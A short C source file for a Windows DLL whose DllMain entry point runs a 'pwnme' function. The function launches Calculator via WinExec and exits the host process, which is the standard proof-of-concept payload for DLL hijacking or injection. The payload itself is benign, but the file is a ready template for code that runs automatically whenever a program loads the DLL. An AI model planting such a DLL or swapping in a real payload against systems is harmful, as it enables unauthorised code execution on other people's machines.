int pwnme()
{
  WinExec("calc", SW_NORMAL);
  exit(0);
  return 0;
}
 
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  pwnme();
  return 0;
}